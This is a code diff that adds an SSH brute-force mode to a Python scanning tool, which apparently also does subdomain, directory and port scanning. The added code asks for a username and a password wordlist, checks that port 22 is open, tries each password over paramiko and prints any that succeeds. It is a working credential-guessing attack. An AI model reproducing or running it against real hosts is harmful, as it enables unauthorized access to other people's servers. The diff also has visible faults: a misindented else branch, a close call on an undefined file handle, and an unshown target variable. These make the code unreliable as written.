@@ -15,7 +15,7 @@ dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
 print("************************************************")
 print("---------------------------------------------------------------------------------------")
 print("+ URL      :            http://"+sys.argv[1])
-print("+ Time     :           "+ dt_string)
+print("+ Time     :            "+ dt_string)
 print("+ Type     :            SUBDOMAIN,search DIRECTORY ,PORT scanning                      ")
 print("---------------------------------------------------------------------------------------")
 
@@ -98,3 +98,44 @@ else:
     print("Looks like no ports are open") 
 
 print("---------------END OF PORT SCANNING-----------------")
+print("[*-*] Starting NIRO in SSH Brute force mode ...")
+
+b = pyfiglet.figlet_format("SSH BruteForce")
+print(b)
+
+username = str(input("[+] Enter Username : "))
+password_file = str(input("[+] Enter password file location : "))
+
+
+def ssh_connect(password, code=0):
+    ssh= paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+       ssh.connect(ip ,port=22,username = username, password=password)
+    except paramiko.AuthenticationException :
+       code = 1
+    ssh.close()
+    return code
+
+if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
+        with open(password_file , 'r') as file:
+            for line in file.readlines():
+                password = line.strip()
+
+                try :
+                    res = ssh_connect(password)
+                    if (res==0) :
+                        print("[OK] Password found: "+ password)
+                        exit(0)
+                    elif res == 1:
+                        print("[NO] No luck")
+                except Exception as e :
+                        print(e)
+                        pass
+
+        input_file.close()
+    else:
+        print("(-_-) PORT 22 CLOSED...")
+
+print("---------------END OF SSH BruteForce-----------------")
